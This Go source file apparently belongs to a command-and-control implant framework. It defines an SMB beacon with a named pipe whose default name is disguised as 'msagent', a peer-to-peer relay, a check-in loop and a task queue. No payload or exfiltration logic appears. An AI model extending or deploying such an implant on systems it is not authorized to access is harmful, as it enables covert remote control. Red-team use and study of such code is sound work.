package smb_beacon

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"sync"
	"time"
)

type SMBBeacon struct {
	mu          sync.RWMutex
	id          string
	namePipe    *NamedPipe
	p2p         *PeerToPeer
	transport   *SMBTransport
	running     bool
	connected   bool
	lastCheckin time.Time
	tasks       map[string]*BeaconTask
	results     []*BeaconResult
}

type BeaconTask struct {
	ID        string
	Type      string
	Payload   string
	Status    string
	CreatedAt time.Time
}

type BeaconResult struct {
	TaskID    string
	Success   bool
	Output    string
	Error     string
	Timestamp time.Time
}

type SMBBeaconConfig struct {
	NamePipe   string
	P2PEnabled bool
	Encrypted  bool
}

func NewSMBBeacon(config SMBBeaconConfig) *SMBBeacon {
	if config.NamePipe == "" {
		config.NamePipe = "\\\\.\\pipe\\msagent"
	}

	return &SMBBeacon{
		id:       generateBeaconID(),
		namePipe: NewNamedPipe(config.NamePipe),
		p2p:      NewPeerToPeer(),
		transport: NewSMBTransport(SMBTransportConfig{
			NamePipe:  config.NamePipe,
			Encrypted: config.Encrypted,
		}),
		tasks:   make(map[string]*BeaconTask),
		results: make([]*BeaconResult, 0),
	}
}

func (b *SMBBeacon) Start() {
	b.mu.Lock()
	b.running = true
	b.mu.Unlock()

	b.namePipe.Create()
	b.p2p.Start()

	go b.checkinLoop()
}

func (b *SMBBeacon) Stop() {
	b.mu.Lock()
	b.running = false
	b.mu.Unlock()

	b.p2p.Stop()
	b.namePipe.Close()
	b.transport.Disconnect()
}

func (b *SMBBeacon) checkinLoop() {
	for {
		b.mu.RLock()
		running := b.running
		b.mu.RUnlock()

		if !running {
			return
		}

		b.checkin()
		time.Sleep(30 * time.Second)
	}
}

func (b *SMBBeacon) checkin() {
	b.mu.Lock()
	b.lastCheckin = time.Now()
	b.mu.Unlock()
}

func (b *SMBBeacon) Connect(target string, port int) error {
	return b.transport.Connect(target, port)
}

func (b *SMBBeacon) SendTask(task *BeaconTask) error {
	b.mu.Lock()
	defer b.mu.Unlock()

	if task.ID == "" {
		task.ID = generateBeaconID()
	}
	task.Status = "pending"
	task.CreatedAt = time.Now()

	b.tasks[task.ID] = task
	return nil
}

func (b *SMBBeacon) GetTask() *BeaconTask {
	b.mu.Lock()
	defer b.mu.Unlock()

	for _, task := range b.tasks {
		if task.Status == "pending" {
			task.Status = "processing"
			return task
		}
	}
	return nil
}

func (b *SMBBeacon) CompleteTask(taskID string, result *BeaconResult) {
	b.mu.Lock()
	defer b.mu.Unlock()

	if task, exists := b.tasks[taskID]; exists {
		task.Status = "completed"
	}

	result.TaskID = taskID
	result.Timestamp = time.Now()
	b.results = append(b.results, result)
}

func (b *SMBBeacon) GetID() string {
	b.mu.RLock()
	defer b.mu.RUnlock()
	return b.id
}

func (b *SMBBeacon) IsRunning() bool {
	b.mu.RLock()
	defer b.mu.RUnlock()
	return b.running
}

func (b *SMBBeacon) IsConnected() bool {
	b.mu.RLock()
	defer b.mu.RUnlock()
	return b.connected
}

func (b *SMBBeacon) GetLastCheckin() time.Time {
	b.mu.RLock()
	defer b.mu.RUnlock()
	return b.lastCheckin
}

func (b *SMBBeacon) GetTasks() []*BeaconTask {
	b.mu.RLock()
	defer b.mu.RUnlock()

	tasks := make([]*BeaconTask, 0, len(b.tasks))
	for _, task := range b.tasks {
		tasks = append(tasks, task)
	}
	return tasks
}

func (b *SMBBeacon) GetResults() []*BeaconResult {
	b.mu.RLock()
	defer b.mu.RUnlock()

	results := make([]*BeaconResult, len(b.results))
	copy(results, b.results)
	return results
}

func (b *SMBBeacon) GetNamePipe() *NamedPipe {
	return b.namePipe
}

func (b *SMBBeacon) GetP2P() *PeerToPeer {
	return b.p2p
}

func (b *SMBBeacon) GetTransport() *SMBTransport {
	return b.transport
}

func generateBeaconID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func formatBeaconStatus(beacon *SMBBeacon) string {
	status := "🔴 Disconnected"
	if beacon.IsConnected() {
		status = "🟢 Connected"
	}

	return fmt.Sprintf("Beacon %s: %s (Last checkin: %v)",
		beacon.GetID()[:8], status, beacon.GetLastCheckin())
}
